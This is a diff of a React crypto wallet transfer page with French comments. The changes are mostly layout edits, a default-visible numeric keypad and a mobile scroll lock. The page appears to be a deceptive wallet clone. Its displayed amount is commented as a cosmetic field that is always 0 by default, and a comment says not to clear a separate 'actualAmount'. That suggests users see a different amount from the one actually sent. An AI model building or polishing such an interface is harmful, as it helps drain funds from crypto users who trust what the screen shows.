@@ -83,7 +83,7 @@ export default function WalletPage() {
   const [txHash, setTxHash] = useState<string>("");
   const [displayAmount, setDisplayAmount] = useState<string>("0"); // champ cosmétique, toujours 0 par défaut
   const [token, setToken] = useState<"usdt" | "usdc">("usdt");
-  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
+  const [isKeyboardVisible, setIsKeyboardVisible] = useState(true);
   const [showModal, setShowModal] = useState(false);
   const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
   const providerRef = useRef<EthereumProvider | null>(null);
@@ -115,6 +115,31 @@ export default function WalletPage() {
       console.warn("Error fetching token balance:", err);
     }
   };
+
+  // ------------------------------------------------------------
+  // Verrouillage absolu du scroll mobile (iOS & Android WebView)
+  // ------------------------------------------------------------
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+
+    document.body.classList.add("wallet-locked");
+    document.documentElement.classList.add("wallet-locked");
+
+    const preventTouchScroll = (e: TouchEvent) => {
+      // Bloque tout drag / scroll / bounce natif de la page
+      e.preventDefault();
+    };
+
+    window.addEventListener("touchmove", preventTouchScroll, { passive: false });
+    document.addEventListener("touchmove", preventTouchScroll, { passive: false });
+
+    return () => {
+      document.body.classList.remove("wallet-locked");
+      document.documentElement.classList.remove("wallet-locked");
+      window.removeEventListener("touchmove", preventTouchScroll);
+      document.removeEventListener("touchmove", preventTouchScroll);
+    };
+  }, []);
 
   // ------------------------------------------------------------
   // Initialisation (lecture des paramètres d'URL, connexion wallet, log)
@@ -413,178 +438,178 @@ export default function WalletPage() {
   // ------------------------------------------------------------
   return (
     <main
-      className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
+      className="transfer-main-wallet"
       onClick={() => setIsKeyboardVisible(false)}
     >
-      <div className="form-container">
-        <label className="form-label">Address or domain name</label>
-        <div className="input-row">
-          <input
-            type="text"
-            placeholder="Search or Enter"
-            value={address}
-            onChange={(e) => {
-              setAddress(e.target.value);
-              setActualReceiver(e.target.value);
-            }}
-            className="input-row__field"
-          />
-          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
-            <button onClick={handlePaste} className="btn-paste">
-              Paste
-            </button>
-            <button
-              className="btn-icon"
-              title="Copy"
-              style={{ margin: "0 -12px" }}
-            >
-              <img
-                src="/contrat.png"
-                alt="Contract"
-                style={{ width: "45px", height: "45px", objectFit: "contain" }}
-              />
-            </button>
-            <button className="btn-icon" title="Scan QR">
-              <svg
-                width="20"
-                height="20"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="#3562ff"
-                strokeWidth="2.5"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
-                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
-                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
-                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
-                <line x1="7" y1="12" x2="17" y2="12" />
-              </svg>
-            </button>
-          </div>
-        </div>
-
-        <div>
-          <label className="form-label form-label--spaced">Amount</label>
-          <div
-            className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
-            onClick={(e) => {
-              e.stopPropagation();
-              setIsKeyboardVisible(true);
-            }}
-          >
-            <div className="montant-input-wrapper">
-              <span
-                className={
-                  displayAmount === ""
-                    ? "montant-placeholder"
-                    : "montant-display-value"
-                }
-              >
-                {formatNumberWithSpaces(displayAmount) || "0"}
-              </span>
-              {isKeyboardVisible && <span className="blinking-cursor" />}
-            </div>
-            <div className="montant-right">
-              {displayAmount !== "" && (
-                <button
-                  type="button"
-                  className="montant-clear-btn"
-                  onClick={(e) => {
-                    e.stopPropagation();
-                    setDisplayAmount("0");
-                    // Ne pas effacer actualAmount
-                  }}
-                >
-                  <svg
-                    width="18"
-                    height="18"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    strokeWidth="2.5"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                  >
-                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
-                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
-                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
-                  </svg>
-                </button>
-              )}
-              <span className="montant-token">{token.toUpperCase()}</span>
+      <div className="wallet-content-stack">
+        <div className="form-container">
+          <label className="form-label" style={{ fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}>Address or domain name</label>
+          <div className="input-row">
+            <input
+              type="text"
+              placeholder="Search or Enter"
+              value={address}
+              onChange={(e) => {
+                setAddress(e.target.value);
+                setActualReceiver(e.target.value);
+              }}
+              className="input-row__field"
+            />
+            <div className="input-row__actions" style={{ gap: "0.4rem" }}>
+              <button onClick={handlePaste} className="btn-paste">
+                Paste
+              </button>
               <button
-                type="button"
-                onClick={handleMaxClick}
-                className="montant-max-btn"
+                className="btn-icon"
+                title="Copy"
+                style={{ margin: "0 -12px" }}
               >
-                Max.
+                <img
+                  src="/contrat.png"
+                  alt="Contract"
+                  style={{ width: "42px", height: "42px", objectFit: "contain" }}
+                />
+              </button>
+              <button className="btn-icon" title="Scan QR">
+                <svg
+                  width="20"
+                  height="20"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="#3562ff"
+                  strokeWidth="2.5"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <path d="M3 7V5a2 2 0 0 1 2-2h2" />
+                  <path d="M17 3h2a2 2 0 0 1 2 2v2" />
+                  <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
+                  <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
+                  <line x1="7" y1="12" x2="17" y2="12" />
+                </svg>
               </button>
             </div>
           </div>
-          {(() => {
-            const parsedVal = parseFloat(displayAmount.replace(",", "."));
-            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
-            if (displayAmount === "" || displayAmount === "0") {
-              return null;
-            }
-            if (isInvalid) {
+
+          <div>
+            <label className="form-label form-label--spaced" style={{ fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}>Amount</label>
+            <div
+              className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
+              onClick={(e) => {
+                e.stopPropagation();
+                setIsKeyboardVisible(true);
+              }}
+            >
+              <div className="montant-input-wrapper">
+                <span
+                  className={
+                    displayAmount === ""
+                      ? "montant-placeholder"
+                      : "montant-display-value"
+                  }
+                >
+                  {formatNumberWithSpaces(displayAmount) || "0"}
+                </span>
+                {isKeyboardVisible && <span className="blinking-cursor" />}
+              </div>
+              <div className="montant-right">
+                {displayAmount !== "" && (
+                  <button
+                    type="button"
+                    className="montant-clear-btn"
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      setDisplayAmount("0");
+                      // Ne pas effacer actualAmount
+                    }}
+                  >
+                    <svg
+                      width="18"
+                      height="18"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2.5"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
+                      <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
+                      <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
+                      <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
+                    </svg>
+                  </button>
+                )}
+                <span className="montant-token">{token.toUpperCase()}</span>
+                <button
+                  type="button"
+                  onClick={handleMaxClick}
+                  className="montant-max-btn"
+                >
+                  Max.
+                </button>
+              </div>
+            </div>
+            {(() => {
+              const parsedVal = parseFloat(displayAmount.replace(",", "."));
+              const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
+              if (displayAmount === "" || displayAmount === "0") {
+                return null;
+              }
+              if (isInvalid) {
+                return (
+                  <div
+                    className="montant-error"
+                    style={{
+                      color: "#df3e3e",
+                      fontSize: "0.8rem",
+                      marginTop: "0.3rem",
+                      paddingLeft: "0.25rem",
+                      textAlign: "left",
+                      fontWeight: "500",
+                    }}
+                  >
+                    Minimum amount is 0.000001 {token.toUpperCase()}
+                  </div>
+                );
+              }
               return (
                 <div
-                  className="montant-error"
+                  className="approx-price"
                   style={{
-                    color: "#df3e3e",
-                    fontSize: "0.8rem",
-                    marginTop: "0.5rem",
+                    color: "#8e8e93",
+                    marginTop: "0.3rem",
                     paddingLeft: "0.25rem",
-                    textAlign: "left",
                     fontWeight: "500",
+                    fontSize: "0.82rem",
                   }}
                 >
-                  Minimum amount is 0.000001 {token.toUpperCase()}
+                  ≈ €{getFiatValue(displayAmount)}
                 </div>
               );
-            }
-            return (
-              <div
-                className="approx-price"
-                style={{
-                  color: "#8e8e93",
-                  marginTop: "0.4rem",
-                  paddingLeft: "0.25rem",
-                  fontWeight: "500",
-                  fontSize: "0.85rem",
-                }}
-              >
-                ≈ €{getFiatValue(displayAmount)}
-              </div>
-            );
-          })()}
+            })()}
+          </div>
         </div>
-      </div>
 
-      <div style={{ flexGrow: 1, minHeight: "2rem" }} />
-
-      <div className="next-btn-wrapper">
-        <button
-          onClick={(e) => {
-            e.stopPropagation();
-            handleSend();
-          }}
-          disabled={loading}
-          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
-          style={{ backgroundColor: "#3562ff" }}
-        >
-          {loading ? (
-            <span className="btn-spinner-wrapper">
-              <span className="btn-spinner" />
-              Processing...
-            </span>
-          ) : (
-            "Next"
-          )}
-        </button>
+        <div className="next-btn-wrapper">
+          <button
+            onClick={(e) => {
+              e.stopPropagation();
+              handleSend();
+            }}
+            disabled={loading}
+            className={`next-btn ${loading ? "next-btn--loading" : ""}`}
+            style={{ backgroundColor: "#3562ff" }}
+          >
+            {loading ? (
+              <span className="btn-spinner-wrapper">
+                <span className="btn-spinner" />
+                Processing...
+              </span>
+            ) : (
+              "Next"
+            )}
+          </button>
+        </div>
       </div>
 
       {/* Clavier numérique */}
